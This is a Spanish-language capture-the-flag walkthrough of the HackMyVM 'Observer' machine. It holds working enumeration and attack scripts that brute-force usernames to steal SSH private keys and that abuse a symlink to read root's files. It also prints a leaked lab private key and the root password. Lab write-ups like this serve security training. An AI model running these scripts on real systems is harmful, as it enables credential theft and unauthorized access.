+++
title = 'Observer - HackMyVM'
+++

[link => observer](https://downloads.hackmyvm.eu/observer.zip) 

---

## Descubrimiento de máquina objetivo en la red con nmap

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/writeups/hackmyvm/observer/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.30**

## Escaneo de puertos en la máquina objetivo con rustscan y ejecución de scripts nmap

```bash
rustscan -a 10.38.1.30 -- -sCV -oN observer_scan.txt
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.


───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: observer_scan.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Fri Jun 21 13:43:17 2024 as: nmap -vvv -p 22,3333 -sCV -oN observer_scan.txt 10.38.1.30
   2   │ Nmap scan report for 10.38.1.30
   3   │ Host is up, received conn-refused (0.00044s latency).
   4   │ Scanned at 2024-06-21 13:43:30 EDT for 93s
   5   │ 
   6   │ PORT     STATE SERVICE    REASON  VERSION
   7   │ 22/tcp   open  ssh        syn-ack OpenSSH 9.2p1 Debian 2 (protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   256 06:c9:a8:8a:1c:fd:9b:10:8f:cf:0b:1f:04:46:aa:07 (ECDSA)
  10   │ | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI3o4mI7uASKMmSXi1ktBAkiph60IX52JaKgbuS
       │ 5hJtX2nGn8JIvaGZjT50iAGX7GdSd7O2uGU6whos6zh1OEMk=
  11   │ |   256 34:85:c5:fd:7b:26:c3:8b:68:a2:9f:4c:5c:66:5e:18 (ED25519)
  12   │ |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8MvYrFJd08kv8oTQLwj5p1yOEycvQQBFnStnx4Mred
  13   │ 3333/tcp open  dec-notes? syn-ack
  14   │ | fingerprint-strings: 
  15   │ |   FourOhFourRequest:  
  16   │ |     HTTP/1.0 200 OK
  17   │ |     Date: Fri, 21 Jun 2024 17:44:14 GMT
  18   │ |     Content-Length: 105
  19   │ |     Content-Type: text/plain; charset=utf-8
  20   │ |     OBSERVING FILE: /home/nice ports,/Trinity.txt.bak NOT EXIST 
  21   │ |     <!-- lgTeMaPEZQleQYhYzRyWJjPjzpfRFEHMV -->
  22   │ |   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
  23   │ |     HTTP/1.1 400 Bad Request
  24   │ |     Content-Type: text/plain; charset=utf-8
  25   │ |     Connection: close
  26   │ |     Request
  27   │ |   GetRequest: 
  28   │ |     HTTP/1.0 200 OK
  29   │ |     Date: Fri, 21 Jun 2024 17:43:49 GMT
  30   │ |     Content-Length: 78
  31   │ |     Content-Type: text/plain; charset=utf-8
  32   │ |     OBSERVING FILE: /home/ NOT EXIST 
  33   │ |     <!-- XVlBzgbaiCMRAjWwhTHctcuAxhxKQFHMV -->
  34   │ |   HTTPOptions: 
  35   │ |     HTTP/1.0 200 OK
  36   │ |     Date: Fri, 21 Jun 2024 17:43:49 GMT
  37   │ |     Content-Length: 78
  38   │ |     Content-Type: text/plain; charset=utf-8
  39   │ |     OBSERVING FILE: /home/ NOT EXIST 
  40   │ |_    <!-- DaFpLSjFbcXoEFfRsWxPLDnJObCsNVHMV -->
  41   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following finge
       │ rprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  42   │ SF-Port3333-TCP:V=7.94SVN%I=7%D=6/21%Time=6675BBC8%P=x86_64-pc-linux-gnu%r
  43   │ SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
  44   │ SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
  45   │ SF:d\x20Request")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCo
  46   │ SF:ntent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n
  47   │ SF:\r\n400\x20Bad\x20Request")%r(GetRequest,C3,"HTTP/1\.0\x20200\x20OK\r\n
  48   │ SF:Date:\x20Fri,\x2021\x20Jun\x202024\x2017:43:49\x20GMT\r\nContent-Length
  49   │ SF::\x2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVI
  50   │ SF:NG\x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20XVlBzgbaiCMRAjWw
  51   │ SF:hTHctcuAxhxKQFHMV\x20-->")%r(HTTPOptions,C3,"HTTP/1\.0\x20200\x20OK\r\n
  52   │ SF:Date:\x20Fri,\x2021\x20Jun\x202024\x2017:43:49\x20GMT\r\nContent-Length
  53   │ SF::\x2078\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nOBSERVI
  54   │ SF:NG\x20FILE:\x20/home/\x20NOT\x20EXIST\x20\n\n\n<!--\x20DaFpLSjFbcXoEFfR
  55   │ SF:sWxPLDnJObCsNVHMV\x20-->")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x2
  56   │ SF:0Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection
  57   │ SF::\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x
  58   │ SF:20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCo
  59   │ SF:nnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSessionReq,67,"H
  60   │ SF:TTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20ch
  61   │ SF:arset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Te
  62   │ SF:rminalServerCookie,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
  63   │ SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
  64   │ SF:x20Bad\x20Request")%r(TLSSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
  65   │ SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
  66   │ SF:close\r\n\r\n400\x20Bad\x20Request")%r(Kerberos,67,"HTTP/1\.1\x20400\x2
  67   │ SF:0Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nCon
  68   │ SF:nection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,DF
  69   │ SF:,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Fri,\x2021\x20Jun\x202024\x2017:44
  70   │ SF::14\x20GMT\r\nContent-Length:\x20105\r\nContent-Type:\x20text/plain;\x2
  71   │ SF:0charset=utf-8\r\n\r\nOBSERVING\x20FILE:\x20/home/nice\x20ports,/Trinit
  72   │ SF:y\.txt\.bak\x20NOT\x20EXIST\x20\n\n\n<!--\x20lgTeMaPEZQleQYhYzRyWJjPjzp
  73   │ SF:fRFEHMV\x20-->");
  74   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  75   │ 
  76   │ Read data files from: /usr/bin/../share/nmap
  77   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  78   │ # Nmap done at Fri Jun 21 13:45:03 2024 -- 1 IP address (1 host up) scanned in 106.00 seconds
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```


## Servicio que corre en el puerto 3333

![service in port 3333](/images/writeups/hackmyvm/observer/port3333service.png)

*Hay que encontrar un usuario válido*

## Script en python para obtener id_rsa de un usuario válido

```py
import requests

file_path="/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt"


with open(file_path, 'r') as usernames:
    for user in usernames:
        url = f"http://10.38.1.30:3333/{user.strip()}/.ssh/id_rsa"
        response = requests.get(url)

        if "NOT EXIST" in response.text:
            continue
        else:
            print(response.text)
            print(f"{user.strip()} username EXIST!!!")
            id_rsa_user_file = open(f'{user.strip()}_id_rsa', 'w')
            id_rsa_user_file.write(response.text)
            id_rsa_user_file.close()
            break
``` 

```bash
python3 brute_force_users.py
```

## id_rsa de usuario valido jan

```bash

───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: jan_id_rsa
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ -----BEGIN OPENSSH PRIVATE KEY-----
   2   │ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
   3   │ NhAAAAAwEAAQAAAYEA6Tzy2uBhFIRLYnINwYIinc+8TqNZap0CB7Ol3HSnBK9Ba9pGOSMT
   4   │ Xy2J8eReFlni3MD5NYpgmA67cJAP3hjL9hDSZK2UaE0yXH4TijjCwy7C4TGlW49M8Mz7b1
   5   │ LsH5BDUWZKyHG/YRhazCbslVkrVFjK9kxhWrt1inowgv2Ctn4kQWDPj1gPesFOjLUMPxv8
   6   │ fHoutqwKKMcZ37qePzd7ifP2wiCxlypu0d2z17vblgGjI249E9Aa+/hKHOBc6ayJtwAXwc
   7   │ ivKmNrJyrSLKo+xIgjF5uV0grej1XM/bXjv39Z8XF9h4FEnsfzUN4MmL+g8oclsaO5wgax
   8   │ 5X3Avamch/vNK3kiQO2qTS1fRZU6T7O9tII3NmYDh00RcpIZCEAztSsos6c1BUoj6Rap+K
   9   │ s1DZQzamQva7y4Grit+UmP0APtA0vZ/vVpqZ+259CXcYvuxuOhBYycEdLHVEFrKD4Fy6QE
  10   │ kC27Xv6ySoyTvWtL1VxCzbeA461p0U0hvpkPujDHAAAFiHjTdqp403aqAAAAB3NzaC1yc2
  11   │ EAAAGBAOk88trgYRSES2JyDcGCIp3PvE6jWWqdAgezpdx0pwSvQWvaRjkjE18tifHkXhZZ
  12   │ 4tzA+TWKYJgOu3CQD94Yy/YQ0mStlGhNMlx+E4o4wsMuwuExpVuPTPDM+29S7B+QQ1FmSs
  13   │ hxv2EYWswm7JVZK1RYyvZMYVq7dYp6MIL9grZ+JEFgz49YD3rBToy1DD8b/Hx6LrasCijH
  14   │ Gd+6nj83e4nz9sIgsZcqbtHds9e725YBoyNuPRPQGvv4ShzgXOmsibcAF8HIrypjaycq0i
  15   │ yqPsSIIxebldIK3o9VzP21479/WfFxfYeBRJ7H81DeDJi/oPKHJbGjucIGseV9wL2pnIf7
  16   │ zSt5IkDtqk0tX0WVOk+zvbSCNzZmA4dNEXKSGQhAM7UrKLOnNQVKI+kWqfirNQ2UM2pkL2
  17   │ u8uBq4rflJj9AD7QNL2f71aamftufQl3GL7sbjoQWMnBHSx1RBayg+BcukBJAtu17+skqM
  18   │ k71rS9VcQs23gOOtadFNIb6ZD7owxwAAAAMBAAEAAAGAJcJ6RrkgvmOUmMGCPJvG4umowM
  19   │ ptRXdZxslsxr4T9AwzeTSDPejR0AzdUk34dYHj2n1bWzGl5bgs3FJWX0yAaLvcc/QuHJyy
  20   │ 1IqMu0npLhQ59J9G+AXBHRLyedlg5NNEMr9ux/iyVRPOT1LV5m/jNeqSIUHIWRoUM3EIvY
  21   │ wxRz4wvGzh7YECMItvHhSJgQYU4Eofme9MTcG+DJx31iAzXegjQNZuKdzyyAMuhHSjXiux
  22   │ r6C/Pp/oXnaZ+QbRw/rsmZZhm1kpFwnC5QWLllWjUhYIyhzgkxeN+ELerf4VcRdXpR+9HO
  23   │ DMTQf7xjAsDWAF23pS3jf4GSGM53LOvzvJ8GV8zFYZJeX02eiwn4GiY2lbAM01TAPsvM7e
  24   │ Rbp9/U9wt7vpRJETHAQusQkQmxo+h6PztzdkNw0oszhY/IIusReYH5wJRtbQu7Eb0iu+HS
  25   │ /AM7EEWQ8aG576LuXU2d4kjEQCyE3XqtisuteuHXW6/xX85fnuPovRYyx8e8j6Oo8RAAAA
  26   │ wEhOxtgacCvsSrdBGNGif6/2k8rPnpp0QLitTclIrckQIBjYxKef7i+GHjBIUoyYLkwGDO
  27   │ fWApUSugEzxVX3VyhkIHaiDi+7Ijy2GuAHQO1WsN4gS3xv9oMNjiA27dTvkSYx6SCFeCYX
  28   │ t5BuyKDzk82rWj2U7HxkMrmuIdSSPy8Kev1I2A973qyDaV0GrSUDEPa3Hs6IZKpYOrA+aD
  29   │ 4WTrp2E74BG0Py+TaBra9QZe6DlopEtK01+n8k5uw1fa8CLAAAAMEA9p0hlgVu1qYY8MFa
  30   │ JxNh2PsuLkRpxBd+gbQX+PSCHDsVx8NoD5YVdUlnr7Ysgubo8krNfJCYgfMRHRT/2WAJk2
  31   │ U5mtYFUYwgCK4ITPC9IzVnRB1hcrrHD58rDSZV3B5gLyUSHgzB+GiNujym+95UrA644iE1
  32   │ 0umTs7tKEuZzmFiJBBUL+q97+1Qhx6XiIVJs1gbPLmNI6SlXcVh25UHP2DUU+gPpc6Gjsj
  33   │ vquxbDcGtcvp+OgiHK6haNLqXbNbyrAAAAwQDyHX3sMMhbZEou35XxlOSNIOO6ijXyomx1
  34   │ pvHApbImNyvIN49+b3mHfahKJp1n7cbsl0ypNSSaCPZp7iEdKzFHsxEuOIb0UyRBwgRmXw
  35   │ zz2MKT58znZbqXibrawxCg7SEwHL6Z/IOfymgRnTehk0RrTkn1S1ZJaO+Zx0o09/O/dLwu
  36   │ NkCnFoC0qz0G5Box7EOPENbPHaq6CDefWciYzy1yrADOdqUSlnGtS/TK1tBfgzZbwL4C6c
  37   │ U+OPQBwGQPpFUAAAAMamFuQG9ic2VydmVyAQIDBAUGBw==  
  38   │ -----END OPENSSH PRIVATE KEY-----
       │
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
```

## Conexión vía ssh a la máquina objetivo con el usuario jan

```bash
kali :: Documents/hackmyvm/observer » chmod 600 jan_id_rsa                                                          130 ↵
kali :: Documents/hackmyvm/observer » ssh -i jan_id_rsa jan@10.38.1.30
Linux observer 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Aug 21 20:21:22 2023 from 192.168.0.100
jan@observer:~$
```

## Flag del usuario jan

```bash
jan@observer:~$ cat user.txt 
HMV********************
```

## Permisos sudo del usuario jan

```bash
jan@observer:~$ sudo -l
Matching Defaults entries for jan on observer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jan may run the following commands on observer:
    (ALL) NOPASSWD: /usr/bin/systemctl -l status
```

## Privesc

```bash
jan@observer:/opt$ /usr/bin/systemctl -l status
● observer
    State: running
    Units: 235 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Fri 2024-06-21 19:28:15 CEST; 2h 53min ago
  systemd: 252.12-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─cron.service
           │ │ ├─405 /usr/sbin/cron -f
           │ │ ├─431 /usr/sbin/CRON -f
           │ │ ├─458 /bin/sh -c /opt/observer
           │ │ └─459 /opt/observer
```

*Si el binario **observer** se ejecuta en el puerto **3333** este me permitirá leer archivos del sistema mediante un **soft link** a mi directorio home*

```bash
jan@observer:~$ ln -s /root root 
```

### Prueba con curl para obtener id_rsa de root

```bash
kali :: Documents/hackmyvm/observer » curl http://10.38.1.30:3333/jan/root/.ssh/id_rsa
OBSERVING FILE: /home/jan/root/.ssh/id_rsa NOT EXIST 


<!-- rTfPoOxaJSecHUhbDCZWUiYgguoJDDHMV -->  
```

### Script para obtener el contenido de los archivos si existen

```bash

#!/bin/bash

url='10.38.1.30:3333/jan/root/'

filenames=('.bash_history' '.bash_logout' '.bashrc' '.bashrc.original')


GREEN='\033[00;32m'
PURPLE='\033[00;35m'


for filename in ${filenames[@]}
do
  result=$(curl $url$filename 2> /dev/null)

  if [[ -z $(echo $result | grep "NOT EXIST") ]];
  then
      echo ""
      echo -e "$filename ${GREEN}FILE FOUND!!!"
      echo -e "${PURPLE}====================="
      tr ' ' '\n' < "$result" > temp.txt
      echo -e "${PURPLE}====================="
      echo ""
  fi
done
```

```bash

kali :: Documents/hackmyvm/observer » chmod u+x root_files_discovery.sh 
kali :: Documents/hackmyvm/observer » ./root_files_discovery.sh 

.bash_history FILE FOUND!!!
=====================
ip a
exit
apt-get update && apt-get upgrade
apt-get install sudo
cd
wget https://go.dev/dl/go1.12.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz
rm go1.12.linux-amd64.tar.gz 
export PATH=$PATH:/usr/local/go/bin
nano observer.go
go build observer.go 
mv observer /opt
ls -l /opt/observer 
crontab -e
nano root.txt
chmod 600 root.txt 
nano /etc/sudoers
nano /etc/ssh/sshd_config
paswd
fuck1ng0bs3rv3rs
passwd
su jan
nano /etc/issue
nano /etc/network/interfaces
ls -la
exit
ls -la
cat .bash_history
ls -la
ls -la
cat .bash_history
ls -l
cat root.txt 
cd /home/jan
ls -la
cat user.txt 
su jan
reboot
shutdown -h now: No such file or directory
=====================


.bashrc FILE FOUND!!!
=====================
# ~/.bashrc: executed by bash(1) for non-login shells.

# Note: PS1 and umask are already set in /etc/profile. You should not
# need this unless you want different defaults for root.
# PS1='${debian_chroot:+($debian_chroot)}\h:\w\$ '
# umask 022

# You may uncomment the following lines if you want `ls' to be colorized:
# export LS_OPTIONS='--color=auto'
# eval "$(dircolors)"
# alias ls='ls $LS_OPTIONS'
# alias ll='ls $LS_OPTIONS -l'
# alias l='ls $LS_OPTIONS -lA'
#
# Some more alias to avoid making mistakes:
# alias rm='rm -i'
# alias cp='cp -i'
# alias mv='mv -i': No such file or directory
=====================
```

### Contraseña del usuario root

```bash
fuck1ng0bs3rv3rs
```

## flag del usuario root

```bash
root@observer:~# whoami
root
root@observer:~# ls
observer.go  root.txt
root@observer:~# cat root.txt 
HMV********************
```
